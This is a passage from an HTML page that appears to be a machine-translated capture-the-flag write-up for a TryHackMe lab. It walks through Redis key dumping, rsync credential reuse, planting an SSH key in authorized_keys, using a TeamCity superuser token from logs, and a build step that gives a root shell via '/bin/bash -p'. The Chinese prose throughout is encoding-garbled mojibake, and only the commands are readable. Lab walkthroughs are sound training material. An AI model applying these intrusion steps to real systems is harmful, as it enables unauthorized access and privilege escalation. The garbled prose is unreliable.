class="oc l nx ny nz nv oa ks nm"/></div></div></a></div><p id="81bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨å¸¸è§„çš„Rediså®ä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨<strong class="jp ir"> nc </strong>è¿›è¡Œè¿æ¥ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<strong class="jp ir"> redis-cliã€‚</strong>æˆ‘å°è¯•çš„ç¬¬ä¸€ä¸ªå‘½ä»¤æ˜¯<strong class="jp ir">ä¿¡æ¯</strong>ï¼Œä½†å®ƒè¿”å›äº†â€œ<strong class="jp ir"><em class="kl">-éœ€è¦NOAUTHè®¤è¯â€</em> </strong>æ¶ˆæ¯ï¼Œè¿™ç¡®è®¤äº†æˆ‘éœ€è¦ä½¿ç”¨ä¸Šé¢æ‰¾åˆ°çš„å¯†ç :</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="826a" class="nd lc iq mz b gy ne nf l ng nh">$ redis-cli -h 10.10.63.208</span><span id="70dd" class="nd lc iq mz b gy ni nf l ng nh">10.10.63.208:6379&gt; info<br/>NOAUTH Authentication required.</span><span id="ced1" class="nd lc iq mz b gy ni nf l ng nh">10.10.63.208:6379&gt; AUTH B65Hx562.....<br/>OK</span></pre><p id="ff78" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é€šè¿‡èº«ä»½éªŒè¯åï¼Œæˆ‘æŸ¥çœ‹æ˜¯å¦æœ‰å¯ä»¥è½¬å‚¨çš„æ•°æ®åº“ã€‚åœ¨Redisä¸­ï¼Œæ•°æ®åº“æ˜¯ä»0å¼€å§‹çš„æ•°å­—ã€‚æ‚¨å¯ä»¥åœ¨å‘½ä»¤<strong class="jp ir"> infoï¼Œ</strong>çš„è¾“å‡ºä¸­æ‰¾åˆ°æ˜¯å¦ä½¿ç”¨äº†<strong class="jp ir"> "Keyspace" </strong>å—å†…çš„ä»»ä½•:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="8978" class="nd lc iq mz b gy ne nf l ng nh"># Keyspace<br/>db0:keys=5,expires=0,avg_ttl=0</span></pre><p id="372c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°æ•°æ®åº“0æ­£åœ¨ä½¿ç”¨ï¼Œå¹¶åŒ…å«5ä¸ªé”®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒRediså°†ä½¿ç”¨æ•°æ®åº“0ã€‚æˆ‘åˆ—å‡ºäº†å¦‚ä¸‹æ‰€ç¤ºçš„é”®ï¼Œå¹¶ç»§ç»­è·å–å†…éƒ¨æ ‡å¿—:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="9f20" class="nd lc iq mz b gy ne nf l ng nh">10.10.63.208:6379&gt; KEYS *<br/>1) "tmp"<br/>2) "int"<br/>3) "authlist"<br/>4) "marketlist"<br/>5) "internal flag"</span><span id="6ac0" class="nd lc iq mz b gy ni nf l ng nh">10.10.63.208:6379&gt; get "internal flag"<br/>"THM{ff8e518addbb.......}"<br/>(0.55s)</span></pre><p id="2b72" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç¬¬äºŒé¢æ——å­å®Œæˆäº†ï¼Œè¿˜æœ‰ä¸€åŠï¼</p><p id="31d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¯¹äºå…¶ä»–æ•°æ®åº“ï¼ŒRedisæ”¯æŒ5ç§æ•°æ®ç±»å‹ã€‚æ‚¨éœ€è¦çŸ¥é“ä¸€ä¸ªé”®æ˜ å°„åˆ°ä»€ä¹ˆç±»å‹çš„å€¼ï¼Œå¯¹äºæ¯ç§æ•°æ®ç±»å‹ï¼Œæ£€ç´¢å®ƒçš„å‘½ä»¤æ˜¯ä¸åŒçš„ã€‚ä»¥ä¸‹æ˜¯æ£€ç´¢ä¸åŒé”®å€¼çš„å‘½ä»¤:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="e260" class="nd lc iq mz b gy ne nf l ng nh">if value is of type string -&gt; GET &lt;key&gt;<br/>if value is of type hash -&gt; HGETALL &lt;key&gt;<br/>if value is of type lists -&gt; lrange &lt;key&gt; &lt;start&gt; &lt;end&gt;<br/>if value is of type sets -&gt; smembers &lt;key&gt;<br/>if value is of type sorted sets -&gt; ZRANGEBYSCORE &lt;key&gt; &lt;min&gt; &lt;max&gt;</span></pre><p id="6e2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ç”¨è¿™äº›çŸ¥è¯†æ¥æ£€ç´¢å…¶ä»–æ•°æ®åº“çš„æ•°æ®ã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="37de" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">ç«¯å£873 â€” rsync</h1><p id="959c" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">åœ¨â€œ<strong class="jp ir"> authlist </strong>â€å¯†é’¥æ•°æ®åº“ä¸­ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªbase64ç¼–ç çš„å€¼ï¼Œè¯¥å€¼åœ¨è¢«è§£ç æ—¶ç»™å‡ºäº†<strong class="jp ir"> rsync </strong>æœåŠ¡çš„ç™»å½•å‡­è¯:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="f3d6" class="nd lc iq mz b gy ne nf l ng nh">10.10.63.208:6379&gt; lrange "authlist" 0 100</span><span id="cafc" class="nd lc iq mz b gy ni nf l ng nh">1)"QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="</span><span id="ccb9" class="nd lc iq mz b gy ni nf l ng nh"># Decoded</span><span id="d131" class="nd lc iq mz b gy ni nf l ng nh">Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67.....</span></pre><blockquote class="me mf mg"><p id="9caa" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated"><strong class="jp ir">æ³¨æ„:</strong> rsyncæ˜¯ä¸€ä¸ªå®ç”¨ç¨‹åºï¼Œç”¨äºåœ¨è®¡ç®—æœºå’Œå¤–éƒ¨ç¡¬ç›˜é©±åŠ¨å™¨ä¹‹é—´ä»¥åŠè”ç½‘çš„è®¡ç®—æœºä¹‹é—´é«˜æ•ˆåœ°ä¼ è¾“å’ŒåŒæ­¥æ–‡ä»¶</p></blockquote><p id="0708" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å‘ç°ä»¥ä¸‹èµ„æºå¯¹äºäº†è§£å¦‚ä½•åˆ©ç”¨rsyncæœåŠ¡éå¸¸æœ‰ç”¨:</p><div class="nj nk gp gr nl nm"><a href="https://book.hacktricks.xyz/pentesting/873-pentesting-rsync" rel="noopener  ugc nofollow" target="_blank"><div class="nn ab fo"><div class="no ab np cl cj nq"><h2 class="bd ir gy z fp nr fr fs ns fu fw ip bi translated">873æµ‹è¯•åŒæ­¥</h2><div class="nt l"><h3 class="bd b gy z fp nr fr fs ns fu fw dk translated">rsyncæ¨¡å—æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç›®å½•å…±äº«ã€‚è¿™äº›æ¨¡å—å¯ä»¥é€‰æ‹©ç”¨å¯†ç ä¿æŠ¤ã€‚è¿™ä¸ªâ€¦</h3></div><div class="nu l"><p class="bd b dl z fp nr fr fs ns fu fw dk translated">book.hacktricks.xyz</p></div></div><div class="nv l"><div class="od l nx ny nz nv oa ks nm"/></div></div></a></div><div class="nj nk gp gr nl nm"><a href="https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-1-rsync/" rel="noopener  ugc nofollow" target="_blank"><div class="nn ab fo"><div class="no ab np cl cj nq"><h2 class="bd ir gy z fp nr fr fs ns fu fw ip bi translated">Linuxé»‘å®¢æ¡ˆä¾‹ç ”ç©¶ç¬¬1éƒ¨åˆ†:Rsync</h2><div class="nt l"><h3 class="bd b gy z fp nr fr fs ns fu fw dk translated">è¿™ç¯‡åšå®¢å°†ä»‹ç»å¦‚ä½•æ”»å‡»ä¸å®‰å…¨çš„Rsyncé…ç½®ï¼Œä»¥ä¾¿åœ¨Linuxä¸Šè·å¾—æ ¹shell</h3></div><div class="nu l"><p class="bd b dl z fp nr fr fs ns fu fw dk translated">www.netspi.com</p></div></div><div class="nv l"><div class="oe l nx ny nz nv oa ks nm"/></div></div></a></div><p id="03a3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘é¦–å…ˆä½¿ç”¨<strong class="jp ir"> nc </strong>æ‰‹åŠ¨ä¸rsyncé€šä¿¡ï¼Œå¹¶åˆ—ä¸¾æ‰€æœ‰å…±äº«:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="4d27" class="nd lc iq mz b gy ne nf l ng nh">$ nc -vn 10.10.63.208 873<br/>(UNKNOWN) [10.10.63.208] 873 (rsync) open<br/><a class="ae of" href="http://twitter.com/RSYNCD" rel="noopener ugc nofollow" target="_blank">@RSYNCD</a>: 31.0        &lt;--- You receive this banner with the version from the server<br/><a class="ae of" href="http://twitter.com/RSYNCD" rel="noopener ugc nofollow" target="_blank">@RSYNCD</a>: 31.0        &lt;--- Then you send the same info<br/>#list                &lt;--- Then you ask the sever to list<br/>files           Necessary home interaction  &lt;--- The server starts enumerating<br/><a class="ae of" href="http://twitter.com/RSYNCD" rel="noopener ugc nofollow" target="_blank">@RSYNCD</a>: EXIT         &lt;--- Sever closes the connection</span></pre><p id="8917" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ä¸Šé¢æ‰¾åˆ°çš„å‡­è¯ï¼Œæˆ‘åˆ—å‡ºäº†åä¸º<strong class="jp ir"> files </strong>çš„å…±äº«ä¸­çš„æ–‡ä»¶:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="b9e8" class="nd lc iq mz b gy ne nf l ng nh">$ rsync rsync://rsync-connect@10.10.63.208/files/<br/>Password: <br/>drwxr-xr-x          4,096 2021/02/01 07:51:14 .<br/>drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal</span></pre><p id="3746" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°æˆ‘ä¹‹å‰åœ¨æ‰§è¡ŒSMBæšä¸¾æ—¶æ‰¾åˆ°çš„ç”¨æˆ·<strong class="jp ir"> sys-internal </strong> userçš„æ–‡ä»¶å¤¹ã€‚æˆ‘åˆ—å‡ºäº†è¿™ä¸ªç›®å½•ä¸­çš„æ–‡ä»¶å¹¶æ‰¾åˆ°äº†æ ¹æ ‡å¿—ï¼Œç„¶åæˆ‘ä¸‹è½½äº†å®ƒ:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="f4e5" class="nd lc iq mz b gy ne nf l ng nh">$ rsync rsync://rsync-connect@10.10.63.208/files/sys-internal/<br/>Password: <br/><br/>.....<br/>-rw-------             38 2021/02/06 06:54:25 user.txt<br/>drwxrwxr-x          4,096 2021/02/02 04:23:00 .cache<br/>drwxrwxr-x          4,096 2021/02/01 07:53:57 .config<br/>drwx------          4,096 2021/02/01 07:53:19 .dbus<br/>drwx------          4,096 2021/02/01 07:53:18 .gnupg<br/>drwxrwxr-x          4,096 2021/02/01 07:53:22 .local<br/>drwx------          4,096 2021/02/01 08:37:15 .mozilla<br/>drwxrwxr-x          4,096 2021/02/06 06:43:14 .ssh<br/>drwx------          4,096 2021/02/02 06:16:16 .thumbnails<br/>drwx------          4,096 2021/02/01 07:53:21 Desktop<br/>drwxr-xr-x          4,096 2021/02/01 07:53:22 Documents<br/>drwxr-xr-x          4,096 2021/02/01 08:46:46 Downloads<br/>drwxr-xr-x          4,096 2021/02/01 07:53:22 Music<br/>drwxr-xr-x          4,096 2021/02/01 07:53:22 Pictures<br/>drwxr-xr-x          4,096 2021/02/01 07:53:22 Public<br/>drwxr-xr-x          4,096 2021/02/01 07:53:22 Templates<br/>drwxr-xr-x          4,096 2021/02/01 07:53:22 Videos</span><span id="bf95" class="nd lc iq mz b gy ni nf l ng nh">$ rsync rsync://rsync-connect@10.10.63.208/files/sys-internal/ user.txt .</span></pre><p id="488d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿˜å‰©ä¸‰é¢æ——å­ï¼Œè¿˜å‰©ä¸€é¢ï¼</p><p id="6a2c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸ºäº†åœ¨ç›®æ ‡æœºå™¨ä¸Šè·å¾—ä¸€ä¸ªshellï¼Œæˆ‘ä½¿ç”¨rsyncä¸Šä¼ äº†ä¸€ä¸ªauthorized_keysæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æˆ‘åœ¨è‡ªå·±çš„æœºå™¨ä¸Šç”Ÿæˆçš„SSHå¯†é’¥:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="1f4d" class="nd lc iq mz b gy ne nf l ng nh">$ ssh-keygen -o<br/>Generating public/private rsa key pair.<br/>Enter file in which to save the key (/home/kali/.ssh/id_rsa): id_rsa<br/>Enter passphrase (empty for no passphrase):</span><span id="92a1" class="nd lc iq mz b gy ni nf l ng nh">$ rsync -av id_rsa.pub rsync://rsync-connect@10.10.63.208/files/sys-internal/.ssh/authorized_keys</span><span id="591b" class="nd lc iq mz b gy ni nf l ng nh">$ ssh -i id_rsa sys-internal@10.10.63.208</span></pre><p id="ce76" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ç°åœ¨å¯ä»¥é€šè¿‡SSHè®¿é—®ç›®æ ‡æœºå™¨äº†ã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="3c3c" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">æ ¹æƒé™æå‡â€”å›¢é˜ŸåŸå¸‚</h1><p id="c05d" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">ä¸€æ—¦æˆ‘è·å¾—äº†å¯¹ç›®æ ‡æœºå™¨çš„è®¿é—®æƒï¼Œæˆ‘å°±å¼€å§‹å¯»æ‰¾å°†æˆ‘çš„æƒé™æå‡åˆ°rootçš„æ–¹æ³•ã€‚æˆ‘æ³¨æ„åˆ°ï¼Œåœ¨æ ¹é¡¶çº§ç›®å½•ä¸­æœ‰ä¸€ä¸ªæœ‰è¶£çš„æ–‡ä»¶å¤¹å«åš<strong class="jp ir"> <em class="kl"> /TeamCity </em> </strong>ã€‚</p><blockquote class="me mf mg"><p id="6df6" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated"><strong class="jp ir">n . b .</strong>T5ã€‘TeamCityæ˜¯ç”±Jet brainså»ºç«‹çš„ç”¨Javaè¯­è¨€ç¼–å†™çš„æ”¯æŒæ„å»ºå’Œéƒ¨ç½²ä¸åŒç±»å‹é¡¹ç›®çš„æŒç»­é›†æˆ<strong class="jp ir">å·¥å…·</strong>ã€‚å®‰è£…åï¼Œå¯ä»¥é€šè¿‡webæµè§ˆå™¨è®¿é—®TeamCity web UIã€‚Windowså‘è¡Œç‰ˆçš„é»˜è®¤åœ°å€æ˜¯<code class="fe og oh oi mz b"><a class="ae of" href="http://localhost/" rel="noopener ugc nofollow" target="_blank">http://localhost/</a></code>ï¼Œè€Œ<code class="fe og oh oi mz b">tar.gz</code>å‘è¡Œç‰ˆçš„é»˜è®¤åœ°å€æ˜¯<code class="fe og oh oi mz b"><a class="ae of" href="http://localhost:8111/" rel="noopener ugc nofollow" target="_blank">http://localhost:8111/</a></code>ã€‚</p></blockquote><p id="477f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å‘ç°ä»¥ä¸‹èµ„æºå¯¹äºäº†è§£å¦‚ä½•åˆ©ç”¨TeamCityéå¸¸æœ‰ç”¨:</p><div class="nj nk gp gr nl nm"><a href="https://github.com/kacperszurek/pentest_teamcity" rel="noopener  ugc nofollow" target="_blank"><div class="nn ab fo"><div class="no ab np cl cj nq"><h2 class="bd ir gy z fp nr fr fs ns fu fw ip bi translated">kacperszurek/pentest_teamcity</h2><div class="nt l"><h3 class="bd b gy z fp nr fr fs ns fu fw dk translated">TLï¼›DR:ä»JetBrains IDE(å¦‚IntelliJæˆ–PyCharm)è·å–å¯†ç ï¼Œå¹¶åœ¨TeamCityå†…éƒ¨ä½¿ç”¨è¿™äº›å‡­è¯â€¦</h3></div><div class="nu l"><p class="bd b dl z fp nr fr fs ns fu fw dk translated">github.com</p></div></div><div class="nv l"><div class="oj l nx ny nz nv oa ks nm"/></div></div></a></div><p id="8344" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸ºäº†è¿æ¥åˆ°è¿è¡Œåœ¨ç«¯å£8111ä¸Šçš„TeamCityæœåŠ¡ï¼Œæˆ‘è®¾ç½®äº†SSHç«¯å£è½¬å‘:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="289e" class="nd lc iq mz b gy ne nf l ng nh">ssh -L 8111:127.0.0.1:8111 -i id_rsa sys-internal@10.10.94.107</span></pre><p id="835d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸€æ—¦è®¾ç½®äº†SSHç«¯å£è½¬å‘ï¼Œæˆ‘å°±å¯ä»¥é€šè¿‡webæµè§ˆå™¨è®¿é—®TeamCity web UIï¼Œå¹¶çœ‹åˆ°ä¸€ä¸ªç™»å½•é¡µé¢:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/740a796ba905f60b73bdd868857fb842.png" data-original-src="https://miro.medium.com/v2/resize:fit:858/format:webp/1*u4zfmX9Wdd8mMdz7isIl_A.png"/></div><figcaption class="ok ol gj gh gi om on bd b be z dk translated">å›¢é˜ŸåŸå¸‚ç”¨æˆ·åå’Œå¯†ç ç™»å½•é¡µé¢</figcaption></figure><p id="ad7f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘è¿˜å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªä»¥è¶…çº§ç”¨æˆ·èº«ä»½ç™»å½•çš„é“¾æ¥ï¼Œè¿™éœ€è¦ä¸€ä¸ªèº«ä»½éªŒè¯ä»¤ç‰Œ:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/ae300054c5aa14d9451ee71d2c672659.png" data-original-src="https://miro.medium.com/v2/resize:fit:700/format:webp/1*GhnDYQAbIrX_DCON2saY1A.png"/></div><figcaption class="ok ol gj gh gi om on bd b be z dk translated">ä½¿ç”¨èº«ä»½éªŒè¯ä»¤ç‰Œçš„è¶…çº§ç”¨æˆ·ç™»å½•</figcaption></figure><p id="3815" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å¼€å§‹å¯»æ‰¾å¯ä»¥ç”¨æ¥é€šè¿‡ä»»ä½•ä¸€ä¸ªç™»å½•é¡µé¢è¿›è¡Œè®¿é—®çš„å‡­è¯ã€‚æœ€ç»ˆï¼Œæˆ‘åœ¨<strong class="jp ir"><em class="kl">/team city/log</em></strong>æ–‡ä»¶å¤¹ä¸­å‘ç°äº†ä¸€ä¸ªåä¸º<strong class="jp ir"> catalina.out </strong>çš„æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªå¯ä»¥ç”¨æ¥ä½œä¸ºè¶…çº§ç”¨æˆ·ç™»å½•çš„ä»¤ç‰Œ:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="0272" class="nd lc iq mz b gy ne nf l ng nh">TeamCity initialized, server UUID: 61907dff-244c-4220-b252-31de83974909, URL: <a class="ae of" href="http://localhost:8111" rel="noopener ugc nofollow" target="_blank">http://localhost:8111</a><br/>TeamCity is running in professional mode<br/>[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)</span></pre><blockquote class="me mf mg"><p id="abf6" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated"><strong class="jp ir">æ³¨æ„:</strong>è¯¥ä»¤ç‰Œå¯¹æ‚¨æ¥è¯´æ˜¯ä¸åŒçš„ï¼Œå¹¶ä¸”åœ¨æœºå™¨æ¯æ¬¡é‡å¯æ—¶éƒ½ä¼šæ”¹å˜ã€‚</p></blockquote><p id="3b48" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å½“æˆ‘ä»¥è¶…çº§ç”¨æˆ·çš„èº«ä»½è¿›å…¥TeamCityåï¼Œæˆ‘åˆ›å»ºäº†ä¸€ä¸ªæ–°é¡¹ç›®:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="oq or di os bf ot"><div class="gh gi op"><img src="../Images/2ee2c08753085160fcc441a1471af2a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2X-pj25DAE7RoL3ifAI5Hg.png"/></div></div><figcaption class="ok ol gj gh gi om on bd b be z dk translated">åˆ›å»ºæ–°é¡¹ç›®ã€‚</figcaption></figure><p id="ef71" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘å¡«å†™äº†æ„å»ºé…ç½®é€‰é¡¹:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="oq or di os bf ot"><div class="gh gi ou"><img src="../Images/76c1cac6547147ca30461634a6566f7f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hKdxKO8ihqutmUqyDfHSNg.png"/></div></div><figcaption class="ok ol gj gh gi om on bd b be z dk translated">ä¸ºé¡¹ç›®åˆ›å»ºç”Ÿæˆé…ç½®ã€‚</figcaption></figure><p id="9b80" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨è¿™ä¹‹åï¼Œæˆ‘å•å‡»äº†build stepså¹¶ä½¿ç”¨ä¸‹é¢çš„å®šåˆ¶è„šæœ¬è®©äºŒè¿›åˆ¶æ–‡ä»¶<strong class="jp ir"> /bin/bash </strong>ä»¥å®Œå…¨rootæƒé™è¿è¡Œ:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="oq or di os bf ot"><div class="gh gi ov"><img src="../Images/240116bfc8440612cfd8c5c32af5eff5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NKdC7RmnSvhK0vl3o3J9Og.png"/></div></div><figcaption class="ok ol gj gh gi om on bd b be z dk translated">æ·»åŠ å°†æä¾›rootæƒé™çš„æ„å»ºæ­¥éª¤ã€‚</figcaption></figure><p id="1561" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æœ€åï¼Œæˆ‘å•å‡»saveï¼Œç„¶åå•å‡»runæŒ‰é’®ï¼Œè¿™å°†ä½¿åº”ç”¨ç¨‹åºä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œå‘½ä»¤ã€‚ç°åœ¨åœ¨shellä¸­ï¼Œæˆ‘å¯ä»¥å°†ç”¨æˆ·åˆ‡æ¢åˆ°rootå¹¶è·å¾—rootæ ‡å¿—ï¼</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="c297" class="nd lc iq mz b gy ne nf l ng nh">$ /bin/bash -p<br/>bash-4.4# whoami<br/>root<br/>bash-4.4# cat /root/root.txt<br/>THM{e8996faea46df0........}</span></pre></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="d6b8" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">ç»“æŸè¯­</h1><p id="4e3b" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">è¿™å°æœºå™¨æä¾›äº†ä¸€ä¸ªæœºä¼šï¼Œè®©æ‚¨äº†è§£å¦‚ä½•ä»å†…éƒ¨æœåŠ¡ä¸­æ£€ç´¢æ„Ÿå…´è¶£çš„ä¿¡æ¯ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥è·å¾—ç³»ç»Ÿè®¿é—®æƒé™ã€‚æœ‰å¤§é‡çš„æœåŠ¡å¯ä»¥åˆ—ä¸¾å¹¶å­¦ä¹ æ›´å¤šå…³äºå¦‚ä½•åˆ©ç”¨å®ƒä»¬çš„çŸ¥è¯†ã€‚æˆ‘çœŸçš„å¾ˆå–œæ¬¢åœ¨è¿™ä¸ªæŒ‘æˆ˜å®¤å·¥ä½œï¼Œå¸Œæœ›çœ‹åˆ°è¿™ç¯‡æ–‡ç« çš„äººèƒ½å­¦åˆ°ä¸€äº›æ–°ä¸œè¥¿ã€‚è°¢è°¢ä½ ä¸€ç›´è¯»åˆ°æœ€åï¼Œç»§ç»­é»‘ä¸‹å»ğŸ˜„ï¼</p><div class="nj nk gp gr nl nm"><a href="https://tryhackme.com/" rel="noopener  ugc nofollow" target="_blank"><div class="nn ab fo"><div class="no ab np cl cj nq"><h2 class="bd ir gy z fp nr fr fs ns fu fw ip bi translated">ç½‘ç»œå®‰å…¨åŸ¹è®­</h2><div class="nt l"><h3 class="bd b gy z fp nr fr fs ns fu fw dk translated">TryHackMeæ˜¯ä¸€ä¸ªå…è´¹çš„å­¦ä¹ ç½‘ç»œå®‰å…¨çš„åœ¨çº¿å¹³å°ï¼Œä½¿ç”¨åŠ¨æ‰‹ç»ƒä¹ å’Œå®éªŒå®¤ï¼Œé€šè¿‡æ‚¨çš„â€¦</h3></div><div class="nu l"><p class="bd b dl z fp nr fr fs ns fu fw dk translated">tryhackme.com</p></div></div><div class="nv l"><div class="ow l nx ny nz nv oa ks nm"/></div></div></a></div></div></div>    
</body>
</html>